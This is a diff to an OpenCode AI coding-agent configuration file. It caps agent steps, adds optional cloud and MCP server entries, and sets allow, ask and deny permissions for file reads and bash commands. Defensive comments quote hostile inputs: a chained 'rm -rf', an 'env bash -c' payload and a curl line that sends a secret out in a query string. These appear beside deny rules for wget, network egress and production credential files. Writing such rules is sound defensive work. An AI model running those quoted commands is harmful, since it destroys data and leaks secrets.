@@ -10,20 +10,31 @@
   // No model pins — select per-session via /models or set OPENCODE_MODEL env var.
   // Note: a per-agent temperature overrides the model's own recommended sampling
   // (many reasoning models expect ~1.0). Remove a line to use the model's default.
+  // steps caps agentic iterations on the read-only agents so a looping local model
+  // stops instead of burning the session (OWASP T4 Resource Overload).
   // ---------------------------------------------------------------------------
   "agent": {
     "build": {
       "temperature": 0.2
     },
     "plan": {
-      "temperature": 0.1
+      "temperature": 0.1,
+      "steps": 20
     },
     "general": {
       "temperature": 0.3
     },
     "explore": {
-      "temperature": 0.1
+      "temperature": 0.1,
+      "steps": 10
     }
+    // Optional: a cloud "escalate" primary agent for the hard tasks — reaching cloud
+    // becomes a deliberate Tab switch, not the default. Prompts leave your network.
+    //,"escalate": { "mode": "primary", "model": "YOUR_CLOUD_PROVIDER/YOUR_MODEL", "temperature": 0.2 }
+    // Optional: send the hidden title/summary/compaction calls to a small, cheap model.
+    //,"title":      { "model": "YOUR_PROVIDER/YOUR_SMALL_MODEL" }
+    //,"summary":    { "model": "YOUR_PROVIDER/YOUR_SMALL_MODEL" }
+    //,"compaction": { "model": "YOUR_PROVIDER/YOUR_SMALL_MODEL" }
   },
 
   // ---------------------------------------------------------------------------
@@ -51,7 +62,7 @@
       "**/appsettings.Staging.json": "ask",
       "**/launchSettings.json": "allow",
 
-      // Production config — denied, matching claude/global/settings.local.json. These
+      // Production config — denied, matching claude/global/settings.json. These
       // routinely carry environment-specific connection strings and credentials, and an
       // "ask" here asks the human to eyeball a file the agent should not need (OWASP T3).
       "**/appsettings.Production.json": "deny",
@@ -163,7 +174,7 @@
     "bash": {
       "*": "ask",
 
-      // --- Allowed dev tooling (synced with claude/global/settings.local.json) ---
+      // --- Allowed dev tooling (synced with claude/global/settings.json) ---
       // Compilers / build tools / debuggers.
       // make / dotnet build|test run whatever the repo's Makefile / MSBuild targets say, and
       // the agent can propose edits to those files — approving such an edit is approving
@@ -181,7 +192,7 @@
       // env / echo: prefix matching cannot see shell metacharacters, so "env*" would
       // auto-approve "env bash -c <payload>" and "echo x && rm -rf dir" (OWASP ASI05,
       // Level 3 bypass — Five Levels of Bash Security). Both are denied, matching
-      // claude/global/settings.local.json. env additionally prints the whole environment,
+      // claude/global/settings.json. env additionally prints the whole environment,
       // API tokens included — resolving a secret into a transcript forces a rotation.
       // Defense for unlisted commands still relies on the "*": "ask" catch-all, and
       // chaining WITHIN an allowed prefix still bypasses — review before approving.
@@ -228,7 +239,7 @@
       // Arbitrary downloads — supply chain risk (OWASP T17).
       "wget*": "deny",
 
-      // Network egress — denied outright, matching claude/global/settings.local.json.
+      // Network egress — denied outright, matching claude/global/settings.json.
       // Denying only the download flags (-o/-O/--output) missed the actual exfiltration
       // channel: data leaves as a query string on an ordinary GET, e.g.
       // "curl https://host/?d=$(cat secret)". OWASP ASI02 calls for per-tool egress
@@ -255,7 +266,7 @@
 
       // .NET dev tooling — build and test are safe to auto-allow.
       // dotnet run intentionally excluded — it executes application code.
-      // Synced with claude/global/settings.local.json allow list.
+      // Synced with claude/global/settings.json allow list.
       "dotnet build*": "allow",
       "dotnet test*": "allow",
       "dotnet restore*": "allow",
@@ -281,7 +292,7 @@
       // git add, git commit, git push, git merge, git rebase, git stash
       // Rationale: these mutate history or remote state — explicit approval at each
       // step is the intended behavior, not an oversight. Synced with
-      // claude/global/settings.local.json.
+      // claude/global/settings.json.
     },
 
     "external_directory": "ask",
@@ -318,6 +329,18 @@
     //"grounded-code-mcp": {
     //  "type": "local",
     //  "command": ["grounded-code-mcp", "serve"],
+    //  "enabled": true
+    //},
+    // ...or, if it runs as an HTTP server on another host:
+    //"grounded-code-mcp": {
+    //  "type": "remote",
+    //  "url": "http://YOUR-MCP-HOST:PORT/mcp",
+    //  "enabled": true
+    //},
+    // Playwright — browser automation for UI checks
+    //"playwright": {
+    //  "type": "local",
+    //  "command": ["npx", "@playwright/mcp@latest"],
     //  "enabled": true
     //},
     // semgrep — local SAST scanner for security and code quality
